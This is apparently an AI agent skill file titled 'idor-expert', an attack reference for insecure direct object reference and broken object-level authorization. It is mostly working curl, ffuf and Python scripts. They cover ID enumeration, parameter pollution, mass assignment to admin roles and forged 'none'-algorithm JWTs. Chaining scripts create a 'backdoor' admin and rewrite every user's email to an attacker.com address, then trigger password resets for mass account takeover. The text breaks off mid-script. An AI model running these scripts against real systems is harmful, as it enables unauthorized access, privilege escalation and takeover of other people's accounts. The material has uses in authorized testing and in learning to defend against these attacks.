---
name: idor-expert
description: IDOR/BOLA master - every technique for horizontal/vertical bypass, ID enumeration, mass assignment, chaining, and multi-tenant exploitation
---

# IDOR/BOLA Master — Complete Attack Reference

## 1. Fundamentals

Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA) occurs when an application uses user-supplied input to directly reference objects without verifying the caller is authorized. This is an access control failure, not an encryption or injection issue.

### 1.1 Where IDOR Lives

- Path parameters: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
- Query string: `?id=42`, `?invoice=2024-00001`, `?doc_id=abc-def`
- Body/JSON: `{"user_id": 321, "order_id": 987}`, `{"user":{"id":456}}`
- Headers/Cookies: `X-Client-ID: 4711`, `X-User-Id: 999`
- GraphQL arguments: `user(id: "8892")`, `query { profile(userId: 123) }`
- WebSocket messages: `{"action":"get_message","message_id":5501}`
- API version paths: `/v1/users/123`, `/v2/users/123`, `/internal/users/123`

### 1.2 Two-Account Testing Setup

Essential methodology. Create two accounts and track their IDs:

```
Account A (attacker):  id=1042,  token=AAAA,  role=user
Account B (victim):    id=1043,  token=BBBB,  role=user
Admin account:         id=1,     role=admin  (known or guessed)
```

For every endpoint on Account A, substitute Account B's ID and see if the server accepts it. For vertical testing, substitute admin IDs or add admin role parameters.

## 2. IDOR Identification Methodology

### 2.1 Endpoint Discovery

```bash
# Wayback machine for historical endpoints
waybackurls target.com | grep -E '(id|user|account|order|invoice|doc|file|profile)' | sort -u

# GAU for URL patterns
gau --subs target.com | grep -E '/api/\w+/\d+' | sort -u

# JS endpoint extraction
cat all_js_urls.txt | subjs | grep -E '(id|uuid|uid|account|user)'

# Parameter discovery
arjun -u https://target.com/api/endpoint --get -o params.json

# API docs
curl -s https://target.com/api/swagger.json | jq '.paths' 2>/dev/null
curl -s https://target.com/api/openapi.json | jq '.paths' 2>/dev/null
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

### 2.2 Parameter Fuzzing for Hidden ID Fields

```bash
# Common ID parameter names
ffuf -u "https://target.com/api/resource?FUZZ=1" \
  -w <(echo -e "id\nuser_id\nuserId\naccount_id\nuid\nuuid\ntoken\ndoc_id\nfile_id\norder_id\ninvoice\nreference\ncustomer_id\nprofile_id\ntarget_id\nobject_id\nresource_id\nowner_id\ncreated_by\nupdated_by") \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,401,403
```

### 2.3 Sequential vs UUID Detection

```bash
# Check if IDs are sequential
curl -s "https://target.com/api/users/1" -H "Authorization: Bearer $TOKEN" | jq '.id'
curl -s "https://target.com/api/users/100" -H "Authorization: Bearer $TOKEN" | jq '.id'
curl -s "https://target.com/api/users/1000" -H "Authorization: Bearer $TOKEN" | jq '.id'

# Check for UUID v1 (timestamp-based, predictable)
curl -s "https://target.com/api/users/me" -H "Authorization: Bearer $TOKEN" | jq -r '.uuid'
# UUID v1 format: timestamp-machine-pid-counter
# Use online tools to extract timestamp from UUID v1

# MongoDB ObjectID: 5ae9b90a2c144b9def01ec37
# First 4 bytes = Unix timestamp (seconds)
# Predictable if you know approx creation time
```

## 3. Horizontal IDOR Techniques

### 3.1 Numeric ID Manipulation

```bash
# Increment/decrement
curl -s "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
# If this returns Account B's data while using Account A's token → IDOR confirmed

# Bulk enumeration
for id in $(seq 1000 1100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/$id" -H "Authorization: Bearer $TOKEN_A")
  length=$(curl -s "https://target.com/api/users/$id" -H "Authorization: Bearer $TOKEN_A" | wc -c)
  echo "ID $id: HTTP $status, length $length"
done | grep -v "403\|404\|401"
```

### 3.2 UUID/Hash-Based ID Manipulation

```bash
# If IDs are hashes, try computing common ones
echo -n "1" | md5sum  # MD5("1")
echo -n "admin" | md5sum  # MD5("admin")
echo -n "admin@target.com" | md5sum  # MD5(email)
echo -n "1" | sha1sum  # SHA1("1")
echo -n "1" | base64  # base64("1")
echo -n "1" | sha256sum  # SHA256("1")

# Test reversed/encoded IDs
echo -n "1043" | base64  # MTA0Mw==
echo -n "MTEwMw==" | base64 -d  # Not reversible? Try variations
```

### 3.3 Parameter Pollution

```bash
# Duplicate parameter - different frameworks choose different values
curl "https://target.com/api/users?id=1042&id=1043" -H "Authorization: Bearer $TOKEN_A"
# PHP: uses last value (1043)
# ASP.NET: uses first value (1042) - but if first blocked, try other order
# Express: uses array [1042, 1043]

# Array notation
curl "https://target.com/api/users?id[]=1042&id[]=1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users?ids[0]=1042&ids[1]=1043" -H "Authorization: Bearer $TOKEN_A"

# HTTP Parameter Pollution (HPP)
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -d "user_id=1042&user_id=1043&email=attacker@evil.com"
```

### 3.4 JSON Injection / Globbing

```bash
# Array of IDs
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id":[1042,1043],"email":"attacker@evil.com"}'

# Wildcard
curl -X POST "https://target.com/api/users" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"*","role":"admin"}'

# Null value
curl -X POST "https://target.com/api/users/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id":null,"email":"attacker@evil.com"}'

# Large integer (leading zeros)
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id":0000001043,"email":"attacker@evil.com"}'

# String delimiter
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"1042,1043","email":"attacker@evil.com"}'

# Nested object
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"profile":{"user_id":1043},"email":"attacker@evil.com"}'
```

### 3.5 HTTP Method Switching

```bash
# If GET is blocked, try other methods
curl -X GET "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
# 403 Forbidden? Try:
curl -X POST "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl -X PUT "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl -X PATCH "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl -X DELETE "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl -X HEAD "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl -X OPTIONS "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"

# Method override headers
curl -X GET "https://target.com/api/users/1043" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HTTP-Method-Override: PUT" \
  -H "X-Method-Override: DELETE" \
  -H "X-HTTP-Method: PATCH"
```

### 3.6 Content-Type Switching

```bash
# Same endpoint, different content type
curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/xml" \
  -d '<request><user_id>1043</user_id><email>attacker@evil.com</email></request>'

curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'user_id=1043&email=attacker@evil.com'

curl -X POST "https://target.com/api/update" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -H "Accept: application/xml" \
  -d '{"user_id":1043,"email":"attacker@evil.com"}'
```

### 3.7 API Version Drift

```bash
# Test all API versions for a given endpoint
curl "https://target.com/api/v1/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/v2/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/v3/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/internal/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/private/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/v1.1/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/v2-beta/users/1043" -H "Authorization: Bearer $TOKEN_A"

# Legacy endpoints
curl "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/1043.json" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/1043.xml" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/getUser?id=1043" -H "Authorization: Bearer $TOKEN_A"
```

### 3.8 Static Keyword Abuse

```bash
# If the API uses "/users/me" or "/users/current":
curl "https://target.com/api/users/me" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/current" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/self" -H "Authorization: Bearer $TOKEN_A"

# Try removing the keyword and using numeric IDs
curl "https://target.com/api/users/1" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"

# Try the keyword with victim context
curl "https://target.com/api/users/me/documents" -H "Authorization: Bearer $TOKEN_B"
# Then try without auth:
curl "https://target.com/api/users/me/documents"
```

### 3.9 Path Traversal for IDOR

```bash
# Directory traversal on ID parameter
curl "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/../users/1044" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/./1043" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/..;/users/1044" -H "Authorization: Bearer $TOKEN_A"

# Encoding bypass
curl "https://target.com/api/users/%2e%2e%2f%75%73%65%72%73%2f%31%30%34%34" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/..%252f..%252fusers%252f1044" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/users/..%c0%aeusers/1044" -H "Authorization: Bearer $TOKEN_A"

# Null byte injection
curl "https://target.com/api/users/1043%00/../../users/1044" -H "Authorization: Bearer $TOKEN_A"
```

## 4. Vertical IDOR / Privilege Escalation

### 4.1 Admin Endpoint Discovery

```bash
# Fuzz for admin endpoints
ffuf -u "https://target.com/FUZZ" -w <(echo -e "admin\napi/admin\nadmin/api\nadministrator\nbackend\ninternal\npanel\ndashboard\nsuperadmin\nconsole\nmanagement\noperator\nstaff\nsysadmin\nadminpanel\ncp\ndev\nportal\nprivate\nroot\nsecure\nserver\nsupport\nsystem") \
  -H "Authorization: Bearer $TOKEN_A" \
  -mc 200,201,301,302,401,403

# Fuzz admin API endpoints  
ffuf -u "https://target.com/api/admin/FUZZ" -w <(echo -e "users\nsettings\nconfig\nroles\npermissions\nbilling\nlogs\naudit\nexport\nimport\nbackup\nhealth\nmetrics\ndebug\nfeature-flags\nenvironment\nmigrations\nwebhooks\notifications\ntemplates\nworkflows") \
  -H "Authorization: Bearer $TOKEN_A" \
  -mc 200,201,401,403
```

### 4.2 Role Parameter Injection

```bash
# Add role/admin fields to any request
curl -X PUT "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'

# Try different role field names
for field in role roles is_admin admin admin_access access_level user_type account_type permission permissions group groups scopes plan tier membership_type account_level clearance; do
  curl -s -X PUT "https://target.com/api/users/me" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test\",\"$field\":\"admin\"}" | jq '.'
done

# Boolean flags
for field in is_admin is_superuser is_staff verified email_verified is_verified is_active is_enterprise is_premium is_internal can_access_admin; do
  curl -s -X PUT "https://target.com/api/users/me" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test\",\"$field\":true}" | jq '.'
done

# Numeric role IDs
for field in role_id roleId user_type_id access_level_id group_id permission_id; do
  curl -s -X PUT "https://target.com/api/users/me" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test\",\"$field\":1}" | jq '.'
done
```

### 4.3 Mass Assignment - Complete Field Dictionary

All fields to try in user profile/registration/settings endpoints:

```bash
# Common privilege escalation fields
PRIV_FIELDS=(
  '{"role":"admin"}'
  '{"roles":["admin","super_admin"]}'
  '{"is_admin":true}'
  '{"is_superuser":true}'
  '{"is_staff":true}'
  '{"permissions":["read","write","delete","admin"]}'
  '{"user_type":"admin"}'
  '{"account_type":"enterprise"}'
  '{"access_level":9999}'
  '{"group":"administrators"}'
  '{"groups":["administrators","superusers"]}'
  '{"scope":"admin"}'
  '{"scopes":["admin","write","delete"]}'
  '{"plan":"enterprise"}'
  '{"tier":"unlimited"}'
  '{"membership":"premium"}'
  '{"clearance":"top_secret"}'
  '{"verified":true}'
  '{"email_verified":true}'
  '{"phone_verified":true}'
  '{"kyc_status":"approved"}'
  '{"is_verified":true}'
  '{"status":"active"}'
  '{"account_status":"active"}'
  '{"membership_status":"active"}'
  '{"billing_tier":"unlimited"}'
  '{"rate_limit":999999}'
  '{"quota":999999}'
  '{"max_users":999999}'
  '{"max_projects":999999}'
  '{"max_storage":999999999}'
)

for payload in "${PRIV_FIELDS[@]}"; do
  echo "=== Testing: $payload ==="
  curl -s -X PUT "https://target.com/api/users/me" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "$payload" | jq -c '{role:.role, is_admin:.is_admin, permissions:.permissions, account_type:.account_type}'
done
```

### 4.4 Mass Assignment in Registration Flows

```bash
# During signup, try adding admin fields
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","role":"admin","is_admin":true,"account_type":"enterprise"}'

# Try nested objects
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","profile":{"role":"admin","is_admin":true}}'

# Try array of roles
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","roles":[1,2,3]}'
```

### 4.5 Multi-Tenant Cross-Account IDOR

```bash
# Change tenant_id
curl "https://target.com/api/organizations/2/users" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/organizations/1/users" -H "Authorization: Bearer $TOKEN_A"

# Change org_id in body
curl -X PUT "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","organization_id":1}'

# Change company_id
curl -X PUT "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","company_id":1}'

# Team/workspace hopping
curl "https://target.com/api/workspaces/1/projects" -H "Authorization: Bearer $TOKEN_A"
curl "https://target.com/api/workspaces/2/projects" -H "Authorization: Bearer $TOKEN_A"
```

## 5. Advanced IDOR Techniques

### 5.1 JWT Binding Bypass

Many APIs use JWTs for auth but never validate that request body IDs match the JWT subject claim.

```bash
# Step 1: Decode your JWT
echo "PAYLOAD" | base64 -d | jq '.'
# {"sub": "1042", "role": "user", "iat": 1234567890}

# Step 2: Send request with different user_id than sub
curl -X POST "https://target.com/api/update-profile" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1043, "email": "attacker@evil.com"}'

# Step 3: If accepted → critical IDOR—the backend never validated user_id against JWT sub
```

### 5.2 Cross-Endpoint Object Reuse

Get an object ID from one endpoint and reuse it on a different, less-protected endpoint:

```bash
# Step 1: Get notification listing (may return message_ids)
curl -s "https://target.com/api/notifications" -H "Authorization: Bearer $TOKEN_A" | jq '.'
# {"notifications": [{"message_id": 88091, "from_user": 1043, ...}]}

# Step 2: Use that message_id on a messages endpoint
curl -s "https://target.com/api/messages/88091" -H "Authorization: Bearer $TOKEN_A" | jq '.'
# If this returns message content from user 1043 (victim) → IDOR!

# Step 3: Chain API endpoints systematically
# Get IDs from: notifications, activities, feeds, logs, audit trails, webhooks
# Try them on: messages, documents, invoices, profiles, settings, orders
```

### 5.3 Async Action IDOR

Background jobs and async operations often skip auth checks at execution time:

```bash
# Step 1: Trigger an export
curl -X POST "https://target.com/api/export" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1043, "format": "csv"}'

# Step 2: Check the job ID (often sequential)
curl -s "https://target.com/api/export/status/12345" -H "Authorization: Bearer $TOKEN_A"
# Job ID 12345 was created for you. Try 12344, 12346:
curl -s "https://target.com/api/export/status/12344" -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/api/export/download/12344" -H "Authorization: Bearer $TOKEN_A"

# Async password reset
curl -X POST "https://target.com/api/reset-password" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "victim_id", "new_password": "Pwned123!"}'
# Frontend may not allow this, but backend might process it!

# Async email update
curl -X POST "https://target.com/api/update-email" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1043, "email": "attacker@evil.com"}'
```

### 5.4 Second-Order IDOR

The ID is stored in one step, then retrieved and used in a later step without re-authorization:

```bash
# Step 1: Create a shareable link
curl -X POST "https://target.com/api/documents/550e8400/share" \
  -H "Authorization: Bearer $TOKEN_A"
# Response: {"share_id": "abc123", "url": "https://target.com/s/abc123"}

# Step 2: Access the share link
curl "https://target.com/s/abc123"
# If this works without auth → it's a feature, not a bug (intended sharing)

# Step 3: BUT — try modifying the share_id
curl "https://target.com/s/abc124"
# If you can enumerate share IDs, that's IDOR on the shared resource

# Alternative: export features
curl -X POST "https://target.com/api/scheduled-exports" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"format":"csv","schedule":"daily","user_id":1043}'
# The export is created now, but runs later as a background job
# The background job may use user_id without re-checking authorization!
```

### 5.5 Cloud Job/Bucket ID Enumeration

```bash
# Sequential job IDs in cloud-integrated apps
for job_id in $(seq 1000 1100); do
  curl -s "https://target.com/api/jobs/$job_id/result" \
    -H "Authorization: Bearer $TOKEN_A" | jq -c 'select(.status == "completed") | {id: .job_id, files: .output_files}'
done

# Check if result files are in S3 with predictable names
curl -s "https://s3.amazonaws.com/target-exports/user_1042_2024-01-01.csv"
curl -s "https://s3.amazonaws.com/target-exports/user_1043_2024-01-01.csv"
# Or: target-reports-export-12345.s3.amazonaws.com

# Enumeration via ffuf
ffuf -u "https://target.com/api/jobs/FUZZ/result" \
  -H "Authorization: Bearer $TOKEN_A" \
  -w <(seq 0 5000) \
  -fr '"error"|"not found"|404' \
  -o job_hits.json
```

### 5.6 GraphQL IDOR

GraphQL often has inconsistent auth between queries and mutations:

```bash
# Query user by ID directly
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: 1043) { id email name role documents { url } privateFiles { url } billingInfo { cardLast4 } } }"}'

# Mutation with user ID
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(input: {id: 1043, email: \"attacker@evil.com\"}) { user { id email } } }"}'

# Alias-based batching
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { me: user(id: 1042) { email } victim: user(id: 1043) { email } }"}'

# Field suggestions leak
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: 1043) { id email role is_admin __typename } }"}'
```

### 5.7 WebSocket IDOR

```bash
# After connecting to WebSocket, try accessing other users' data
wscat -c "wss://target.com/ws?token=$TOKEN_A"

# Once connected:
{"action": "get_messages", "user_id": 1043}
{"action": "get_document", "document_id": 550}
{"action": "subscribe_to_updates", "user_id": 1043}
```

### 5.8 Blind IDOR Detection

```bash
# Time-based blind IDOR
time curl -s "https://target.com/api/users/1042" -H "Authorization: Bearer $TOKEN_A" -o /dev/null -w "%{time_total}"
time curl -s "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A" -o /dev/null -w "%{time_total}"

# Status-code-based
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/1042" -H "Authorization: Bearer $TOKEN_A"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A"

# Response-length-based  
curl -s "https://target.com/api/users/1042" -H "Authorization: Bearer $TOKEN_A" | wc -c
curl -s "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A" | wc -c

# Content-diff-based
diff <(curl -s "https://target.com/api/users/1042" -H "Authorization: Bearer $TOKEN_A" | jq -S) \
     <(curl -s "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A" | jq -S)
```

## 6. Bulk Enumeration

### 6.1 ffuf for Sequential IDs

```bash
# Basic sequential ID enumeration
ffuf -u "https://target.com/api/users/FUZZ" \
  -H "Authorization: Bearer $TOKEN_A" \
  -w <(seq 1 10000) \
  -fr '"error"|"not found"|404|"message":"Not Found"' \
  -o idor_hits.json

# Filter results
jq -r '.results[] | select(.status == 200) | .input.FUZZ, .length' idor_hits.json

# With rate limiting awareness
ffuf -u "https://target.com/api/users/FUZZ" \
  -H "Authorization: Bearer $TOKEN_A" \
  -w <(seq 1 10000) \
  -fr '"error"|"not found"|404' \
  -p 0.5 \
  -rate 10 \
  -o idor_hits.json
```

### 6.2 Multi-Dimensional ffuf Enumeration

```bash
# Two parameters (chat between two users)
ffuf -u "https://target.com/api/chats?user1=NUM1&user2=NUM2" \
  -H "Authorization: Bearer $TOKEN_A" \
  -w <(seq 1 100):NUM1 -w <(seq 1 100):NUM2 \
  -ac \
  -fr '"not found"|"empty"|\[\]' \
  -o chats.json

# Remove symmetric duplicates
jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' chats.json
```

### 6.3 User Enumeration via Error Oracle

```bash
# Different error messages reveal valid vs invalid IDs
curl -s "https://target.com/api/users/1042" -H "Authorization: Bearer $TOKEN_A" | jq '.'
# {"id": 1042, "name": "User 1042", ...}  ← Valid user

curl -s "https://target.com/api/users/99999" -H "Authorization: Bearer $TOKEN_A" | jq '.'
# {"error": "User not found"}  ← Different from auth error

# fuzz based on error message
ffuf -u "https://target.com/api/users/FUZZ" \
  -H "Authorization: Bearer $TOKEN_A" \
  -w <(seq 1000 2000) \
  -fr 'User not found' \
  -o valid_users.json
```

### 6.4 Turbo Intruder for Mass Enumeration

```python
# Burp Turbo Intruder script for mass ID enumeration
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2)

    for i in range(1, 10001):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '404 Not Found' not in req.response:
        table.add(req)
```

## 7. IDOR Chaining

### 7.1 IDOR Disclosure → IDOR Write → Privilege Escalation

```bash
# STAGE 1: Mass disclosure to find role strings and UUIDs
for i in $(seq 1 200); do
  curl -s "https://target.com/api/users/$i" -H "Authorization: Bearer $TOKEN_A"
done | jq -c 'select(.role != null) | {uid, uuid, role, email}' > all_users.json

# Identify admin role string
ADMIN_ROLE=$(jq -r 'select(.role != "user") | .role' all_users.json | sort -u)
echo "Admin role: $ADMIN_ROLE"
# uuid needed for writing to admin's record
ADMIN_UUID=$(jq -r 'select(.role == "'"$ADMIN_ROLE"'") | .uuid' all_users.json | head -1)

# STAGE 2: Write IDOR on own record to escalate role
curl -X PUT "https://target.com/api/users/$MY_UID" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{
    \"uid\": $MY_UID,
    \"uuid\": \"$MY_UUID\",
    \"role\": \"$ADMIN_ROLE\",
    \"email\": \"$MY_EMAIL\",
    \"name\": \"$MY_NAME\"
  }"

# STAGE 3: Verify escalation
curl -s "https://target.com/api/admin/users" -H "Authorization: Bearer $TOKEN_A" | jq '. | length'

# STAGE 4: Create backdoor admin
curl -X POST "https://target.com/api/users" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{
    "uid": 9999,
    "uuid": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "role": "'"$ADMIN_ROLE"'",
    "email": "backdoor@evil.com",
    "name": "backdoor"
  }'
echo "Backdoor admin created: uid=9999, role=$ADMIN_ROLE"
```

### 7.2 Write IDOR → Mass Email Rewrite → Mass ATO

```bash
# After confirming write IDOR on email field:
while read -r uid uuid email name; do
  curl -X PUT "https://target.com/api/users/$uid" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d "{
      \"uid\": $uid,
      \"uuid\": \"$uuid\",
      \"email\": \"victim+${uid}@attacker.com\",
      \"role\": \"user\"
    }"
done < <(jq -r '.[] | "\(.uid) \(.uuid) \(.email) \(.name)"' all_users.json)

# Then trigger password reset for all:
while read -r uid _ _; do
  curl -X POST "https://target.com/api/password-reset" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"victim+${uid}@attacker.com\"}"
done < <(jq -r '.[] | "\(.uid) \(.email)"' all_users.json)

# Reset links arrive at attacker-controlled inbox → mass ATO
```

### 7.3 IDOR + Mass Assignment = Full Admin

```bash
# Step 1: Find write IDOR on PATCH/PUT
curl -s -X PATCH "https://target.com/api/users/1043" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"display_name":"PWNED"}'

# Step 2: Check if victim's name changed
curl -s "https://target.com/api/users/1043" -H "Authorization: Bearer $TOKEN_A" | jq '.display_name'
# If "PWNED" → write IDOR confirmed

# Step 3: Add privilege fields
curl -s -X PATCH "https://target.com/api/users/$MY_UID" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true,"role":"admin","permissions":["read","write","delete","admin"]}'

# Step 4: Verify
curl -s "https://target.com/api/users/me" -H "Authorization: Bearer $TOKEN_A" | jq '{role, is_admin, permissions}'
```

### 7.4 IDOR + JWT Weakness = Full ATO

```bash
# Step 1: Decode JWT
JWT=$(curl -s "https://target.com/api/login" -d '{"email":"test@test.com","pass":"test"}' | jq -r '.token')
# header.payload.signature

# Step 2: Check if "sub" claim matches user_id used in API
PAYLOAD=$(echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null)
echo "$PAYLOAD" | jq '.'
# {"sub":"1042","role":"user","iat":...}

# Step 3: If JWT is the ONLY auth (no server-side session check):
# Modify user_id in requests to be 1043 (victim) → if API accepts, JWT has sub claim
# but backend never validates sub against request body user_id

# Step 4: Try JWT "none" algorithm attack
# Change algorithm to "none", remove signature
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1043','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

## 8. Tool-Assisted IDOR Hunting

### 8.1 Burp Autorize

```bash
# 1. Install Autorize from BApp Store
# 2. Configure with Account B's cookie/token (the victim)
# 3. Browse as Account A (attacker)
# 4. Autorize automatically re-sends every request with Account B's cookie
# 5. Any 200 response with Account B's data is an IDOR
```

### 8.2 Burp Auto Repeater

```bash
# 1. Install Auto Repeater from BApp Store
# 2. Create rule: replace Account A's ID with Account B's ID in all requests
# 3. Configure conditional response highlighting:
#    - Match in response: Account B's name/email
#    - Highlight: red for potential IDOR
# 4. Browse normally; Auto Repeater does the rest
```

### 8.3 Burp Intruder for ID Enumeration

```python
# Turbo Intruder script for IDOR enumeration
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           engine=Engine.BURP2)

    # Test IDs 1-5000
    for id in range(1, 5001):
        engine.queue(target.req, id)

    # Also try around your own ID
    base_id = 1042
    for offset in range(-50, 51):
        engine.queue(target.req, base_id + offset)

def handleResponse(req, interesting):
    # Check if response differs from "not found" pattern
    if 'not found' not in req.response.lower() and '404' not in str(req.response):
        table.add(req)
```

### 8.4 Python Automation for IDOR Detection

```python
#!/usr/bin/env python3
import requests
import concurrent.futures
import json
import sys

TARGET = "https://target.com"
TOKEN = "Bearer YOUR_TOKEN_HERE"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

def test_idor(user_id):
    """Test if endpoint returns data for a given user ID"""
    try:
        r = requests.get(
            f"{TARGET}/api/users/{user_id}",
            headers=HEADERS,
            timeout=10
        )
        if r.status_code == 200 and r.json().get("id") != 1042:
            return (user_id, r.status_code, r.json())
        return None
    except Exception as e:
        return None

# Thread pool for parallel testing
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    future_to_id = {executor.submit(test_idor, uid): uid for uid in range(1, 2001)}
    for future in concurrent.futures.as_completed(future_to_id):
        result = future.result()
        if result:
            uid, status, data = result
            if data.get("email") and data.get("role"):
                print(f"[!] IDOR on uid={uid}: {data.get('email')} ({data.get('role')})")
```

### 8.5 Mass Assignment Auto-Detection Script

```python
#!/usr/bin/env python3
import requests
import json

TARGET = "https://target.com"
TOKEN = "Bearer YOUR_TOKEN"

# Fields to probe for mass assignment
PROBE_FIELDS = {
    "role": "admin",
    "roles": ["admin"],
    "is_admin": True,
    "is_superuser": True,
    "permissions": ["read", "write", "delete", "admin"],
    "account_type": "enterprise",
    "access_level": 9999,
    "verified": True,
    "email_verified": True,
    "plan": "enterprise_unlimited",
    "tier": "premium",
    "billing_tier": "enterprise",
